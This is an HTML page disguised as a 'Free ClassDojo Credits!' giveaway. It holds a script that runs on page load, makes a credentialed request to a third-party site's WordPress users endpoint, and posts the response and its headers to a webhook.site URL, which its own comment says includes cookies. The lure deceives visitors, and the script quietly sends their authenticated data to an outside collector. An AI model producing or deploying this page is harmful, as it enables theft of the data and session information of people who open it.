<!DOCTYPE html>
<html>
<head>
  <title>Free ClassDojo Credits!</title>
</head>
<body>
  <h1>Click to claim your free credits!</h1>
<script>  
async function fetchData() {
  const r = await fetch('https://blog.arlo.com/wp-json/wp/v2/users', {  
    credentials: 'include'  
  });

  // Ensure the GET request does not include a body
  const responseText = await r.text();

  // Send FULL request headers and response data to your server (includes cookies!)  
  await fetch('https://webhook.site/77be87a4-2b5c-4a85-a81b-cec771bd6a73', {  
    method: 'POST',  
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({  
      headers: [...r.headers.entries()],  
      data: responseText  
    })  
  });
}

// Run the fetchData function
fetchData();
</script>  
</body>
</html>
